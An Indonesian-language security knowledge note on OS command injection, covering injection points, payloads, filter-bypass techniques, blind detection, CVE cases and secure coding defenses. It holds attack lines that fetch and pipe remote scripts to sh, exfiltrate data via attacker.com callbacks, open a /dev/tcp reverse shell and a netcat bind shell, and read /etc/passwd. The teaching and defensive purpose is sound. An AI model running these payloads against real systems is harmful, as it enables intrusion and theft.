---
title: Command Injection — Deep Dive, Exploitation, and Defense
tags: [security, web, exploitation, command-injection, rce]
aliases: [command-injection, os-command-injection, shell-injection]
status: pending
created: 2026-08-15
updated: 2026-08-15
cssclasses: [wide-table]
---

> [!abstract] Command Injection (OS Command Injection) terjadi ketika aplikasi meneruskan input yang tidak disanitasi ke system shell, memungkinkan attacker mengeksekusi perintah OS tambahan — dampak akhirnya **Remote Code Execution (RCE)**: membaca file, drop reverse shell, atau pivot ke internal network. Catatan ini memetakan seluruh attack surface: injection points & dangerous functions per bahasa, payload dasar & shell metacharacters, teknik bypass (encoding, whitespace alternatif, newline, glob, filter bypass), deteksi blind injection via OAST, studi kasus CVE nyata 2016-2024, pola secure coding (parameterization, whitelist, least privilege), tooling detection (Commix, Burp, Nuclei, Interactsh), dan checklist audit untuk blue team. Melengkapi [[web-security-moc]] (peta keamanan web) dan berpasangan dengan [[reverse-shell-payloads-reference]] (payload post-exploitation) serta [[untrusted-artifact-analysis]] (analisis input tidak tepercaya).

# Command Injection — Deep Dive 🎯

## Daftar Isi
1. [[#1. Injection Points & Dangerous Functions]]
2. [[#2. Payload Dasar]]
3. [[#3. Bypass Techniques]]
4. [[#4. Blind Command Injection — Detection via OAST]]
5. [[#5. Command Injection vs Code Injection]]
6. [[#6. Studi Kasus Nyata]]
7. [[#7. Defense — Secure Coding Patterns]]
8. [[#8. Detection & Testing Tools]]
9. [[#9. Blue Team — Audit Checklist]]
10. [[#10. Red Team Perspective]]
11. [[#11. Referensi]]
12. [[#12. Koneksi ke Vault]]

Command Injection (OS Command Injection) terjadi ketika aplikasi meneruskan input yang tidak disanitasi ke system shell, memungkinkan attacker mengeksekusi perintah OS tambahan. Dampaknya: **Remote Code Execution (RCE)** — attacker bisa membaca file, drop reverse shell, atau pivot ke internal network.

## 1. Injection Points & Dangerous Functions
| Template engine | `{cmd}` di Jinja2/Twig tanpa sandbox | Python, PHP |
| Deserialization | gadget chain → `Runtime.exec` | Java (ysoserial) |
| Cron/API hook | parameter ke `nslookup`, `dig`, `ping` | Aplikasi apapun |

| Layer | Fungsi Berbahaya | Bahasa |
|-------|------------------|--------|
| System call | `system()`, `popen()`, `exec()` | C, PHP, Python |
| Shell passthrough | `Runtime.getRuntime().exec()` (string tunggal) | Java |
| Child process | `child_process.exec()`, `execSync()` | Node.js |
| Subprocess | `os.system()`, `subprocess.run(..., shell=True)`, `os.popen()` | Python |
| PHP execution | `shell_exec()`, `system()`, `exec()`, `passthru()`, backticks | PHP |
| Ruby | `` `cmd` ``, `system()`, `Kernel#exec` dengan interpolasi | Ruby |

**Catatan:** Fungsi-fungsi di atas **exploitable by design** begitu input tidak terpercaya menyentuhnya.

## 2. Payload Dasar

```bash
; id
| id
`id`
$(id)
%0a id
ping 1.2.3.4 -n 1 & whoami
'; cat /etc/passwd #
```

### Shell Metacharacters

Shell interpreter memperlakukan karakter tertentu sebagai kontrol, bukan teks literal:

| Operator | Fungsi | Contoh Payload |
|----------|--------|----------------|
| `;` | Jalankan perintah berikutnya terlepas dari hasil pertama | `host=x; whoami` |
| `&&` | Jalankan perintah berikutnya hanya jika pertama sukses | `host=x && curl evil.tld/x.sh\|sh` |
| `||` | Jalankan perintah berikutnya hanya jika pertama gagal | `host=invalid \| id` |
| `\|` | Pipe output perintah pertama ke perintah kedua | `host=x \| nc attacker.tld 4444` |
| `` ` `` atau `$()` | Command substitution — output di-inline | `host=$(whoami)` |
| `&` | Background process | `host=x & net user` |
| `>` / `<` | Redirect output/input, bisa overwrite file | `host=x > /tmp/out` |
| `#` | Comment — mengabaikan sisa command | `'; cat /etc/passwd #` |

## 3. Bypass Techniques

### 3.1 Encoding
- URL encode (`%20`, `%0a`)
- Double encoding
- Unicode (`%u0020`)

### 3.2 Whitespace Alternatif
- `${IFS}` (Linux)
- Tab (`%09`)
- `$' '`
- `{cat,/etc/passwd}` (brace expansion)

### 3.3 Newline Injection
Payload di baris baru setelah parameter valid: `param=ok%0acat%20/etc/passwd`

### 3.4 Wildcard/Glob
`/???/???t*` untuk mengurangi karakter yang diblokir

### 3.5 Filter Bypass
Jika kata "cat" diblokir:
- `c''at`
- `c$@at`
- `c\at` (backslash)
- `cat` (newline)
- `tac` (reverse output)


**Variasi tambahan:**
- **Environment variable** — `$PATH`, `$IFS`, `$()` chaining untuk memecah filter.
- **Custom fuzzing** — uji `%00`, `%0a`, UTF-16, double URL-encode; banyak WAF hanya normalize sekali.

### 3.6 Command Chaining di Satu Input
Attacker bisa konstruksi multi-stage payload dalam satu field:
```bash
; curl -s http://attacker.com/payload.sh | sh
```


### 3.7 Common Filter Bypass Table

| Filter | Bypass |
|--------|--------|
| Blokir `;` dan `|` | `$()` / backtick / newline `%0a` |
| Blokir `cat` | `c""at`, `c$@at`, `/bin/c?t`, `tac` (reverse) |
| Blokir spasi | `${IFS}`, `<`, `%09`, `$'\x20'` |
| Blokir `/` | `$(pwd)` + `cd`, `${PWD%/*}` |
| Blokir kata kunci | concat via shell: `wh$(echo oami)` |

## 4. Blind Command Injection — Detection via OAST

Ketika output tidak terlihat, gunakan side channel:

### Time-based
```bash
# Linux
; sleep 5
# Windows
ping -n 6 127.0.0.1
```

### DNS Exfil
```bash
curl http://$(hostname).attacker.com
nslookup $(whoami).attacker.com
```

### OAST dengan Interactsh
```bash
# Interactsh (ProjectDiscovery) — public OAST service
nslookup xyz.oastify.com
curl http://xyz.oastify.com/$(whoami)
```

Interactsh mendeteksi OOB callback termasuk command injection.

### Tools untuk Blind Injection
- **Burp Collaborator** (PortSwigger)
- **Interactsh** (ProjectDiscovery)
- **Commix** dengan deteksi time-based/out-of-band

## 5. Command Injection vs Code Injection

| Fitur | Command Injection | Code Injection |
|-------|-------------------|----------------|
| **Definisi** | Inject & execute system commands melalui input | Inject & execute arbitrary code dalam konteks bahasa pemrograman |
| **Eksekusi** | Shell OS (`/bin/sh`, `cmd.exe`) | Runtime bahasa (PHP eval, Python exec, Java deserialization) |
| **Payload** | `; id`, `$(cat /etc/passwd)` | `system('id')`, `__import__('os').system('id')` |
| **Contoh CVE** | CVE-2018-7600 (Drupalgeddon2) | Log4Shell (JNDI injection) |
| **Impact** | RCE — akses sistem | RCE — akses aplikasi |

Perbedaan utama: Command injection mengeksekusi perintah sistem dengan **privilege user** aplikasi; Code injection mengeksekusi kode dalam **konteks aplikasi** itu sendiri.

## 6. Studi Kasus Nyata

### CVE-2018-7600 (Drupalgeddon2) — CVSS 9.8
Drupal gagal mensanitasi input user sebelum di-merge ke form element render properties, memungkinkan attacker inject PHP callables yang dieksekusi oleh Render API. Versi rentan: Drupal 6.x, <7.58, 8.2.x, <8.3.9, <8.4.6, <8.5.1. Dampak: **unauthenticated RCE** pada jutaan situs.

### CVE-2021-44228 (Log4Shell)
Bukan command injection klasik, tapi JNDI lookup memicu remote code execution via JNDI injection. Dampak setara RCE pada aplikasi Java.

### CVE-2016-5734 — phpMyAdmin
Parameter `pma_username` diteruskan ke `preg_replace` dengan flag `/e` → evaluasi kode. Pelajaran: fitur "elegant" (regex `/e`, eval) = permukaan serangan.


### CVE-2024-13985 — Dahua EIMS
Command injection pada `capture_handle.action` interface, parameter `captureCommand` tanpa sanitasi, memungkinkan **unauthenticated** attacker mengeksekusi arbitrary system commands. CVSS: **10.0 Critical**.

### CVE-2024-9042 — Kubernetes NodeLogQuery
Command injection pada fitur NodeLogQuery Kubernetes (Windows node). Exploit menggunakan `$(oscommand)` sebagai pattern di endpoint `/logs/`.

### CVE-2024-51378 — CyberPanel
Pre-auth RCE via command injection pada endpoint `/dns/getresetstatus` dan `/ftp/getresetstatus`.

### CVE-2024-8156 — AutoGPT
Command injection pada `workflow-checker.yml`, input `github.head.ref` digunakan secara insecure, memungkinkan attacker inject arbitrary commands via branch name.

## 7. Defense — Secure Coding Patterns

### 7.1 Defense Option 1: Hindari OS Commands
**Primary defense**: hindari memanggil OS commands langsung. Gunakan built-in library functions:

| Task | Unsafe Pattern | Safe Alternative |
|------|----------------|------------------|
| Directory creation | `system("mkdir /dir_name")` | `mkdir()` native |
| File operations | `system("cp src dest")` | File I/O APIs |
| Network requests | `system("curl url")` | HTTP client libraries |
| Archive operations | `system("tar -xzf file")` | Archive manipulation libraries |

### 7.2 Defense Option 2: Parameterization + Input Validation
Jika OS commands tidak bisa dihindari:

**Layer 1 — Parameterization**:
- Gunakan mekanisme structured yang memisahkan command dan data
- Jangan gabungkan command dan arguments dalam satu string

**Layer 2 — Input Validation**:
- **Commands**: Whitelist perintah yang diizinkan
- **Arguments**: Positive validation / whitelist regex

Regex contoh: `^[a-z0-9]{3,10}$` — hanya huruf kecil dan angka, tanpa metacharacters.

### 7.3 Code Examples — Safe vs Unsafe

#### Python
```python
# ❌ UNSAFE — shell string concat
os.system("ping -c 1 " + user_input)
subprocess.run(f"ping -c 1 {user_input}", shell=True)  # shell=True = rentan

# ✅ SAFE — list args tanpa shell
import subprocess
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

#### Java
```java
// ❌ UNSAFE — string tunggal
Runtime.getRuntime().exec("ping -c 1 " + input);

// ✅ SAFE — ProcessBuilder dengan args terpisah
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", input);
```

#### PHP
```php
// ❌ UNSAFE
$out = shell_exec("nslookup " . $input);

// ⚠️ AMAN-ish — escapeshellarg
$out = shell_exec("nslookup " . escapeshellarg($input));
```

**Catatan**: `escapeshellarg()` mencegah command splitting tapi **tidak** mencegah argument injection.

#### Node.js
```js
// ❌ UNSAFE
const { exec } = require('child_process');
exec(`ping -c 4 ${req.query.host}`, (err, stdout) => { ... });

// ✅ SAFE — execFile dengan array args
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', req.query.host], (err, stdout) => { ... });
```

### 7.4 Additional Defenses

- **Least Privilege**: Aplikasi jalan dengan user non-root
- **`--` delimiter**: POSIX Guideline 10 — `curl -- $url` treat everything after `--` as operands
- **Seccomp/Landlock**: Runtime protection untuk proses aplikasi
- **AppArmor/SELinux**: Container non-root

## 8. Detection & Testing Tools

### 8.1 Automation Tools

| Tool | Fungsi |
|------|--------|
| **Commix** | Automates detection & exploitation of OS command injection |
| **Burp Intruder** | Payload wordlist: `;id`, `|id`, `$(id)`, `` `id` ``, `%0aid` |
| **Nuclei** | Template-based scanning — command-injection templates available |
| **Interactsh** | OAST callback collector — DNS/HTTP interaction detection |

### 8.2 Commix Usage
```bash
# Basic
python commix.py -u "http://target/ping?ip=127.0.0.1" --data="ip=127.0.0.1"

# Dengan cookie & proxy
python commix.py -u "http://target/page" --cookie="session=abc" --proxy="http://127.0.0.1:8080"

# OS command execution
python commix.py -u "http://target/ping?ip=127.0.0.1" --os-cmd="whoami"
```

### 8.3 WAF Detection
OWASP CRS (Core Rule Set) rules 932100-932260 untuk deteksi command injection pattern.

## 9. Blue Team — Audit Checklist

- [ ] Semua eksekusi OS pakai **parameterized/no-shell API**?
- [ ] Input user divalidasi dengan **whitelist** (bukan blacklist)?
- [ ] WAF rule CRS aktif (932xxx) dengan paranoia level sesuai?
- [ ] Blind injection terdeteksi di log (out-of-band DNS)?
- [ ] Aplikasi jalan dengan **least privilege**?
- [ ] Codebase di-scan dengan SAST untuk fungsi berbahaya (`system(`, `exec(`, `Runtime.getRuntime`, `ProcessBuilder`)?

## 10. Red Team Perspective

Command injection sering jadi **foothold → stable shell**:

- **Reverse shell**: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
- **Bind shell**: `nc -lvp 4444 -e /bin/sh`
- **Out-of-band exfil**: `curl http://attacker.collaborator.$(whoami).com`
- **Tooling**: Burp Intruder, Commix, atau manual dengan netcat

**Blue-side logging yang relevan:** audit semua eksekusi perintah — deteksi anomali command line (Sysmon Event ID 1, EDR telemetry).


---

## 11. Referensi

- OWASP Command Injection Defense Cheat Sheet
- OWASP Top 10 2021 — A03: Injection
- PayloadsAllTheThings — Command Injection
- PortSwigger Web Security Academy — OS command injection labs
- Commix GitHub Repository
- Interactsh — ProjectDiscovery
- CVE-2018-7600 (Drupalgeddon2) — Metasploit module
- CVE-2024-13985 — Dahua EIMS RCE
- CVE-2024-9042 — Kubernetes NodeLogQuery RCE
- phpMyAdmin CVE-2016-5734 — Metasploit module
- CVE-2021-44228 (Log4Shell) — NVD


## 12. Koneksi ke Vault

| Catatan | Koneksi |
|---------|---------|
| [[web-security-moc]] | Peta utama keamanan web — command injection salah satu cabang attack class |
| [[reverse-shell-payloads-reference]] | Payload post-exploitation setelah RCE tercapai |
| [[untrusted-artifact-analysis]] | Analisis input tidak tepercaya — akar masalah injection |
| [[ssrf-deep-dive]] | Serangan lain yang memanfaatkan input tidak tersanitasi |
| [[directory-traversal-payload-collection]] | Payload traversal — sering dikombinasikan dengan injection |
| [[http-parameter-pollution-deep-dive]] | Manipulasi parameter HTTP — teknik serupa di layer berbeda |
